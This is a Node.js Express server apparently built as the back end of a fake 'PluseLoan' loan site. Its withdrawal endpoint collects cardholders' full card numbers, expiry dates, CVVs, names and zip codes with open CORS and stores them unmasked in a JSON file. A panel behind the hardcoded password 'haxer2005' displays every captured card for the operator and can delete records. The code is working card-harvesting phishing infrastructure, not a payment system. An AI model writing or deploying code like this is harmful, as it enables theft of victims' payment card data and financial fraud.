const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000; // For Render compatibility

// Middleware to parse JSON bodies and URL-encoded forms
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Add CORS headers to allow requests from the frontend
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// File to store withdrawal data
const withdrawalsFile = path.join(__dirname, 'withdrawals.json');

// Initialize withdrawals file if it doesn’t exist
if (!fs.existsSync(withdrawalsFile)) {
    fs.writeFileSync(withdrawalsFile, JSON.stringify([]));
}

// POST endpoint to save withdrawal info
app.post('/api/withdraw', (req, res) => {
    const { cardholderName, cardNumber, expiry, cvv, zipCode, loanAmount } = req.body;

    if (!cardholderName || !cardNumber || !expiry || !cvv || !zipCode || !loanAmount) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    const withdrawal = {
        cardholderName,
        cardNumber, // No masking
        expiry,
        cvv,    // No masking
        zipCode, // Added Zip Code
        loanAmount,
        timestamp: new Date().toISOString()
    };

    // Read existing data
    fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
        if (err) {
            return res.status(500).json({ error: 'Failed to read data' });
        }

        const withdrawals = JSON.parse(data);
        withdrawals.push(withdrawal);

        // Write updated data
        fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2), (err) => {
            if (err) {
                return res.status(500).json({ error: 'Failed to save data' });
            }
            res.json({ message: 'Withdrawal info saved successfully' });
        });
    });
});

// GET endpoint for root (/) with password protection
app.get('/', (req, res) => {
    // If password isn’t provided yet, show a form
    if (!req.query.password) {
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Enter Password</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f8f8; }
                    .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; }
                    input { padding: 8px; margin: 10px 0; width: 200px; border: 1px solid #ddd; border-radius: 5px; }
                    button { padding: 10px 20px; background: #000; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
                    button:hover { background: #1a1a1a; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Enter Password</h2>
                    <form action="/" method="GET">
                        <input type="password" name="password" placeholder="Password" required>
                        <br>
                        <button type="submit">Submit</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    } else {
        // Check password
        if (req.query.password !== 'haxer2005') {
            return res.send(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Access Denied</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f8f8; }
                        .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>Wrong Password</h2>
                        <p>Try again.</p>
                        <a href="/">Back</a>
                    </div>
                </body>
                </html>
            `);
        }

        // Password correct, display withdrawals vertically
        fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
            if (err) {
                return res.status(500).send('Error reading withdrawals data');
            }

            const withdrawals = JSON.parse(data);
            let html = `
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>PluseLoan Withdrawals</title>
                    <style>
                        body { 
                            font-family: Arial, sans-serif; 
                            margin: 20px; 
                            background: #f8f8f8; 
                        }
                        h1 { 
                            text-align: center; 
                            color: #1e88e5; 
                            font-size: 24px; 
                            margin-bottom: 20px; 
                        }
                        .record { 
                            background: #fff; 
                            padding: 15px; 
                            margin: 10px auto; 
                            border-radius: 10px; 
                            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); 
                            max-width: 600px; 
                            position: relative; 
                        }
                        .record p { 
                            margin: 5px 0; 
                            font-size: 14px; 
                        }
                        .record p strong { 
                            color: #333; 
                        }
                        .delete-btn { 
                            position: absolute; 
                            top: 15px; 
                            right: 15px; 
                            background: #f44336; 
                            color: #fff; 
                            border: none; 
                            padding: 5px 10px; 
                            border-radius: 5px; 
                            cursor: pointer; 
                            font-size: 14px; 
                        }
                        .delete-btn:hover { 
                            background: #d32f2f; 
                        }
                    </style>
                </head>
                <body>
                    <h1>Withdrawal Records</h1>
            `;

            withdrawals.forEach((w, index) => {
                html += `
                    <div class="record">
                        <button class="delete-btn" onclick="deleteRecord(${index})">Delete</button>
                        <p><strong>Timestamp:</strong> ${new Date(w.timestamp).toLocaleString()}</p>
                        <p><strong>Amount:</strong> $${parseFloat(w.loanAmount).toFixed(2)}</p>
                        <p><strong>Card Number:</strong> ${w.cardNumber}</p>
                        <p><strong>Expiration:</strong> ${w.expiry}</p>
                        <p><strong>CVV:</strong> ${w.cvv}</p>
                        <p><strong>Cardholder Name:</strong> ${w.cardholderName}</p>
                        <p><strong>Zip Code:</strong> ${w.zipCode}</p>
                    </div>
                `;
            });

            html += `
                    <script>
                        function deleteRecord(index) {
                            if (confirm('Are you sure you want to delete this record?')) {
                                fetch('/delete/' + index, { method: 'DELETE' })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.message) {
                                            window.location.reload();
                                        } else {
                                            alert('Failed to delete record.');
                                        }
                                    })
                                    .catch(error => {
                                        console.error('Error:', error);
                                        alert('Error deleting record.');
                                    });
                            }
                        }
                    </script>
                </body>
                </html>
            `;

            res.send(html);
        });
    }
});

// DELETE endpoint to remove a record
app.delete('/delete/:index', (req, res) => {
    const index = parseInt(req.params.index);

    fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
        if (err) {
            return res.status(500).json({ error: 'Failed to read data' });
        }

        let withdrawals = JSON.parse(data);

        if (index < 0 || index >= withdrawals.length) {
            return res.status(400).json({ error: 'Invalid index' });
        }

        // Remove the record at the specified index
        withdrawals.splice(index, 1);

        // Write updated data back to file
        fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2), (err) => {
            if (err) {
                return res.status(500).json({ error: 'Failed to save data' });
            }
            res.json({ message: 'Record deleted successfully' });
        });
    });
});

// Start server
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
